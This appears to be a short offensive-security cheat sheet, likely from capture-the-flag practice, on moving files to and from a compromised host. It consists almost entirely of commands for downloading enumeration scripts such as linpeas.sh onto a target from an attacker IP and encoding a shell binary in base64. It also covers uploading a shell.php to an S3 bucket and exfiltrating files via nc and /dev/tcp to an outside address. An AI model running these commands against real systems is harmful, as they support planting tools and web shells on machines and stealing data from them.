
# Start a local webserver 
```
python3 -m http.server 80
```
Download a file on the remote server from our local machine 
```
wget http://10.10.14.1/linpeas.sh
```
# _curl_
```
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```
# _base64_
Convert a file to `base64` 
```
base64 shell -w 0
```
Convert a file from `base64` back to its orig
```
echo f0VMR...SNIO...InmDwU \| base64 -d > shell
```
## _aws_
Copie an shell file on remote s3 bucket
```
aws --endpoint=http://s3.domaine_name s3 cp shell.php s3://domaine_name
```
## _ssh_
Transfer a file to the remote server with `scp` (requires SSH access) 
```
scp linenum.sh user@remotehost:/tmp/linenum.sh
```
Transfer a file from the remote server
```
scp remote_username@10.10.0.2:/remote/file.txt /local/directory
```
## **with nc**
	on local
```
nc -lvp port > file
```
 on remote host
```
nc -w 3 l@ip port < file
``` 
```
cat /opt/manage/execute_query > /dev/tcp/10.10.16.108/4321
```

